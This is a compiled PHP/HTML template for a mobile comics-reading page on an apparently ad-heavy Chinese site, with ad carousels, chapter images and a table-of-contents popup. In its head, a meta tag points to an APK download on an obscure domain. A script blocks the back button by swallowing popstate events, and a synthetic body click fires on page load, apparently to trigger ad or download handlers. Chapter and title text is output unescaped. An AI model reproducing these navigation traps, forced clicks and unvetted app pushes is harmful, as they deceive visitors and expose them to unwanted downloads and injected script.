<?php /*a:1:{s:62:"/www/wwwroot/zhanqun.dahuangua.com/view/index/comics/read.html";i:1732120830;}*/ ?>
<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="c" c="<?php echo htmlentities($channel); ?>">
    <meta name="s" s="0">
    <meta name="my" k="rinimei">
    <meta name="load" v="https://faoptk.hhuuiwxbsk.cn/zz17c.apk">
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />
    <meta name="applicable-device" content="mobile">
    <script>
     
    </script>
    <link rel="icon" href="static/app-icon.png">
    <link rel="apple-touch-icon" href="static/app-icon.png">
    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-icons.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/noty.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/noty-themes/bootstrap-v4.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/mobile.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/style.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/swiper-bundle.min.css" />
    <script type="text/javascript" src="/static/js/rem.min.js"></script>
    <script type="text/javascript" src="/static/js/jquery-2.2.4.min.js"></script>
    <script type="text/javascript" src="/static/js/swiper-bundle.min.js"></script>
    <script type="text/javascript" src="/static/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="/static/js/clipboard.min.js"></script>
    <script type="text/javascript" src="/static/js/lozad.min.js"></script>
    <script type="text/javascript" src="/static/js/sweetalert2.js"></script>
    <script type="text/javascript" src="/static/js/noty.min.js"></script>
    <script type="text/javascript" src="/static/js/qrcode.min.js"></script>
    <script type="text/javascript" src="/static/js/bylqwya.js"></script>
    <script type="text/javascript" src="/static/comics/js/app.js"></script>
    

    <link rel="stylesheet" href="/static/comics/css/styleOld.css">
    <link rel="stylesheet" href="/static/comics/css/home.css">
    <link rel="stylesheet" href="/static/comics/css/introduction.css">
 

    <link rel="stylesheet" href="/static/comics/css/styles.css">
    <link rel="stylesheet" href="/static/comics/css/swiperGf.css" />
    <link rel="stylesheet" href="/static/css/commons.css" />
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            window.addEventListener('popstate', function (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }, true);
            setTimeout(function () {
                document.body.click();
            }, 0);
        });   
    </script>
<title>漫画阅读</title>
<link rel="stylesheet" type="text/css" href="/static/css/styles.css" />
</head>

<body>

<!-- 人气榜 -->
<div id="page">
      <!-- 广告开始 -->
        <!-- 顶部 -->
        <div class="header">
            <div class="headerBox">
                <div class="logoBox">
                    <img src="<?php echo htmlentities($logo); ?>" class="header_logo">
                </div>
                <a href="/novel/search/<?php echo htmlentities($channel); ?>.html">
                    <div class="header_input">
                        <div class="headerInput"> 搜索</div>
                        <img src="/static/novel/img/search.png" class="header_search">

                    </div>
                </a>

                <img src="/static/novel/img/collectBtn.png" class="header_collect">

            </div>
            <div class="header_nav">
                <a href="/novel/<?php echo htmlentities($channel); ?>.html">
                    <div class="header_navLine">
                        <div class="header_navTxt">
                            全部
                        </div>
                        <div class="header_navli"></div>

                    </div>
                </a>
                <?php if(is_array($novelCate) || $novelCate instanceof \think\Collection || $novelCate instanceof \think\Paginator): $i = 0; $__LIST__ = $novelCate;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
                <a href="/novel/<?php echo htmlentities($channel); ?>.html?cate_id=<?php echo htmlentities($item['id']); ?>">
                    <div class="header_navLine">
                        <div class="header_navTxt">
                            <?php echo htmlentities($item['title']); ?>
                        </div>
                        <div class="header_navli"></div>
                    </div>
                </a>
                <?php endforeach; endif; else: echo "" ;endif; ?>

            </div>
        </div>
        <div class="contentBox">
            <div class="swiper mySwiper">
                <div class="swiper-wrapper">
                    <?php if(is_array($BannerList) || $BannerList instanceof \think\Collection || $BannerList instanceof \think\Paginator): $i = 0; $__LIST__ = $BannerList;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$Banner): $mod = ($i % 2 );++$i;?>
                    <div class="swiper-slide ad " data-id="<?php echo htmlentities($Banner['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>" data-site="<?php echo htmlentities($site_id); ?>"
                        data-url="<?php echo htmlentities($Banner['androidurl']); ?>"><img src="<?php echo htmlentities($Banner['img']); ?>" onerror="this.src='/static/images/loading_img_bg_default.jpg';"></div>
                    <?php endforeach; endif; else: echo "" ;endif; ?>
                </div>
                <!-- <div class="swiper-button-next"></div>
                <div class="swiper-button-prev"></div> -->
                <div class="swiper-pagination"></div>
            </div>
        </div>
      
        <!-- 顶部结束 -->
        <!-- 九宫格 -->
        <div class="index_jiugongge">
            <?php if(is_array($jiugongge_img) || $jiugongge_img instanceof \think\Collection || $jiugongge_img instanceof \think\Paginator): $i = 0; $__LIST__ = $jiugongge_img;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
            <div class="index_jiugongge_li ad" data-id="<?php echo htmlentities($item['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>" data-site="<?php echo htmlentities($site_id); ?>"
                data-url="<?php echo htmlentities($item['androidurl']); ?>">
                <img class="index_jiugongge_img" src="<?php echo htmlentities($item['img']); ?>" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
                <div class="index_jiugongge_text"><?php echo htmlentities($item['name']); ?></div>
            </div>
            <?php endforeach; endif; else: echo "" ;endif; ?>

        </div>
         <!-- 轮播图 -->
        <div class="index_swiper">
            <div class="swiper-banner swiper">
                <div class="swiper-wrapper">
                    <?php if(is_array($BannerList2) || $BannerList2 instanceof \think\Collection || $BannerList2 instanceof \think\Paginator): $i = 0; $__LIST__ = $BannerList2;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$Banner): $mod = ($i % 2 );++$i;?>
                    <div class="swiper-slide">
                        <img class="banner-img ad" src="<?php echo htmlentities($Banner['img']); ?>" alt=""
                         data-id="<?php echo htmlentities($Banner['id']); ?>" 
                         data-channel="<?php echo htmlentities($channel); ?>" 
                         data-site="<?php echo htmlentities($site_id); ?>"
                         data-url="<?php echo htmlentities($Banner['androidurl']); ?>"
                         >
                    </div>
                    <?php endforeach; endif; else: echo "" ;endif; ?>
         
                </div>
                <div class="swiper-pagination"></div>
            </div>

        </div>
     <!-- 广告结束 -->






    <div style="width: 100%;position: fixed;background: #000;top: 0;">
        <!-- 返回栏 -->
        <div class="nav">
            <a href="/comics/info/<?php echo htmlentities($channel); ?>.html?id=<?php echo htmlentities($novel['id']); ?>" class="left">
                <img class="leftBtn" src="/static/images/btn_left.svg" />
                <div class="leftName">漫画阅读</div>
            </a>
            <div class="right">
              
            </div>
        </div>

    </div>




 <!-- 中部广告开始 -->
 <?php if(is_array($zhong_img_ad) || $zhong_img_ad instanceof \think\Collection || $zhong_img_ad instanceof \think\Paginator): $i = 0; $__LIST__ = $zhong_img_ad;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
 <img src="<?php echo htmlentities($item['img']); ?>" class="banner ad" data-id="<?php echo htmlentities($item['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>"
 data-site="<?php echo htmlentities($site_id); ?>" data-url="<?php echo htmlentities($item['androidurl']); ?>">
 <?php endforeach; endif; else: echo "" ;endif; ?>
 <!-- 抖音 -->
 <div class="index_dyList" style="padding: 8px 0;border: 0px;">
     <?php if(is_array($zhong_font_ad) || $zhong_font_ad instanceof \think\Collection || $zhong_font_ad instanceof \think\Paginator): $i = 0; $__LIST__ = $zhong_font_ad;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
   
         <div class="index_dyListBox ad" data-id="<?php echo htmlentities($item['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>" data-site="<?php echo htmlentities($site_id); ?>"
         data-url="<?php echo htmlentities($item['androidurl']); ?>">
             <div class="flexBox">
                 <img src="<?php echo htmlentities($item['img']); ?>" class="index_dyList_img" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
                 <div class="index_dyList_dyTxt"><?php echo htmlentities($item['name']); ?></div>

             </div>

             <img src="/static/novel/img/rightIcon.png" class="index_dyList_rightIcon">
         </div>

     <?php endforeach; endif; else: echo "" ;endif; ?>

 </div>
<!-- 中部广告结束-->






    <div class="contentBox">


        <!-- 小说标题 -->
        <div>
            <!-- 标题 -->
            <div class="readTitle">
              
                <?php echo $chapter['name']; ?>
            </div>

            <!--<?php echo $chapter['content']; ?>-->
                <?php if(is_array($manhuaList) || $manhuaList instanceof \think\Collection || $manhuaList instanceof \think\Paginator): $i = 0; $__LIST__ = $manhuaList;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$manhua): $mod = ($i % 2 );++$i;?>
                <img style="width: 100%;margin-top: 5px;" class="lozad" data-src="<?php echo $manhua; ?>" src="/static/images/loading_img_bg_default.jpg" alt="">
                <?php endforeach; endif; else: echo "" ;endif; ?>
        </div>







           <!-- 广告开始 -->
           <?php if(is_array($di_img_ad) || $di_img_ad instanceof \think\Collection || $di_img_ad instanceof \think\Paginator): $i = 0; $__LIST__ = $di_img_ad;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
           <img class="banner ad" src="<?php echo htmlentities($item['img']); ?>"  data-id="<?php echo htmlentities($item['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>"
            data-site="<?php echo htmlentities($site_id); ?>" data-url="<?php echo htmlentities($item['androidurl']); ?>" onerror="this.src='/static/images/loading_img_bg_default.jpg';"/>
           <?php endforeach; endif; else: echo "" ;endif; ?>
       
           <div class="index_dyList" style="padding: 8px 0;border: 0px;">
           
               <?php if(is_array($di_img_font_ad) || $di_img_font_ad instanceof \think\Collection || $di_img_font_ad instanceof \think\Paginator): $i = 0; $__LIST__ = $di_img_font_ad;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$item): $mod = ($i % 2 );++$i;?>
                   <div class="index_dyListBox ad " data-id="<?php echo htmlentities($item['id']); ?>" data-channel="<?php echo htmlentities($channel); ?>"
                   data-site="<?php echo htmlentities($site_id); ?>" data-url="<?php echo htmlentities($item['androidurl']); ?>">
                       <div class="flexBox">
                           <img src="<?php echo htmlentities($item['img']); ?>" class="index_dyList_img" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
                           <div class="index_dyList_dyTxt"><?php echo htmlentities($item['name']); ?></div>

                       </div>

                       <img src="/static/video/img/rightIcon.png" class="index_dyList_rightIcon">
                   </div>
                   <?php endforeach; endif; else: echo "" ;endif; ?>

           </div>
          <!-- 广告结束 -->

        <!-- 分页 -->



    </div>

    <!-- 导航栏 -->
    <div class="lableList paddingRead" style="margin: 10px;">
        <a href="/comics/info/<?php echo htmlentities($channel); ?>.html?id=<?php echo htmlentities($novel['id']); ?>" class="lable flex" style="height:36px;">
            <img src="/static/images/return.svg" style="margin-top: 3px;" /><span style="margin-left: 5px;">返回</span>
        </a>
        <div class="lable flex" id="mulvBtn" style="height:36px;"><img src="/static/images/mulv.svg" /><span
                style="margin-left: 5px;">目录</span></div>
        <a href="/comics/chapter/<?php echo htmlentities($channel); ?>.html?chapter_id=<?php echo htmlentities($pre['id']); ?>" class="lable flex" style="height:36px;"><img src="/static/images/chevron_Left.svg" /><span style="margin-left: 5px;">上一话</span>
        </a>
        <a href="/comics/chapter/<?php echo htmlentities($channel); ?>.html?chapter_id=<?php echo htmlentities($next['id']); ?>" style="height:36px;" class="lable flex"><span>下一话</span><img src="/static/images/right.svg"
                                                                                                                                          style="margin-left: 5px;margin-top: 1px;" /></a>
    </div>
</div>

<!-- 弹窗 -->
<div class="popupRead">
    <!-- 目录 -->
    <div class="mulv">
        <div class="mulvName"><?php echo $novel['title']; ?></div>
        <div class="mulvTop">

            <div class="mulvtext">目录—更新至<?php echo htmlentities($catalogcount); ?>话</div>
            <div class="mulvRight">
                <img class="zhengxu" id="imgToChange" src="/static/images/zhengxu.svg" />
                <div class="mulvRightText" id="textToChange">正序</div>
            </div>
        </div>

        <div class="mulvPz">
            <?php if(is_array($cataloglist) || $cataloglist instanceof \think\Collection || $cataloglist instanceof \think\Paginator): $i = 0; $__LIST__ = $cataloglist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$index): $mod = ($i % 2 );++$i;?>
            <a  href="/comics/chapter/<?php echo htmlentities($channel); ?>.html?chapter_id=<?php echo htmlentities($index['id']); ?>" class="pzList">
                <div <?php if($chapter['id'] == $index['id']): ?> style="color: #FDA765;"  <?php endif; ?> class="pzLeft"><?php echo $index['name']; ?></div>
        <!--<div class="pzRight">第<span style="color: #FFFFFF99;"><?php echo htmlentities($index['id']); ?></span><?php echo htmlentities($index['chapter']); ?></div>-->
        </a>
        <?php endforeach; endif; else: echo "" ;endif; ?>
    </div>

</div>


</div>
<div class="popupBack"></div>
<script type="text/javascript" src="/static/js/utils_mobile.js"></script>
<!-- <script src="/static/common/jq.js"></script> -->
<script src="/static/common/swiper.js"></script>
<script src="/static/common/apps.js"></script>
<script>
  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
    $('[data-toggle="popover"]').popover();
    const observer = lozad(); // lazy loads elements with default selector as '.lozad'
    observer.observe();
  });
  // sweetalert2弹窗配置
  const SSwal = Swal.mixin({
    confirmButtonColor: '#007bff',
    cancelButtonColor: '#6c757d',
    confirmButtonText: '确定',
    cancelButtonText: '取消',
    reverseButtons: true,
  })
 
  /*
  debugger
  */
  myDialog(
      [
         
      ]
  )
 
</script>




<script>
    $(document).on('click', 'selector', function (event) {
        event.preventDefault();
    });

    $(document).ready(function () {
        $('#mulvBtn').click(function () {
            $('.popupRead').show();
            $('.popupBack').show();
        });
    });
    $(document).ready(function () {
        $('.popupBack').click(function () {
            $('.popupRead').hide();
            $('.popupBack').hide();
        });
    });
    $(document).ready(function () {
        $('#mulvBtn').click(function () {

        });
    });
    $(document).ready(function(){
        //目录点击变亮
        $(".choosePage").click(function(){
            $(".choosePage").removeClass("choosePage_active");
            $(this).addClass("choosePage_active");
            var moveX = $(this).position().left+$(this).parent().scrollLeft();
            var pageX = document.documentElement.clientWidth;
            var blockWidth = $(this).width();
            var left = moveX-(pageX/2)+(blockWidth/2);
            $(".chooseMl").scrollLeft(left);
        });
        //点击正倒序
        var $link = $('.pzList');
        $('.mulvTop').click(function() {

            var currentText = $('#textToChange').text();
            if (currentText === "正序") {
                $('#textToChange').text("倒序");
                $('#imgToChange').attr('src', '/static/images/daoxu.svg');
                var container = $('.mulvPz');
                var items = container.find('.pzList');
                items = items.toArray().reverse();
                container.empty();
                $.each(items, function(index, item) {
                    container.append(item);
                });
            } else {
                $('#textToChange').text("正序");
                $('#imgToChange').attr('src', '/static/images/zhengxu.svg');
                var container = $('.mulvPz');
                var items = container.find('.pzList');
                items = items.toArray().reverse();
                container.empty();
                $.each(items, function(index, item) {
                    container.append(item);
                });
            }
        });
    });
</script>
</body>

</html>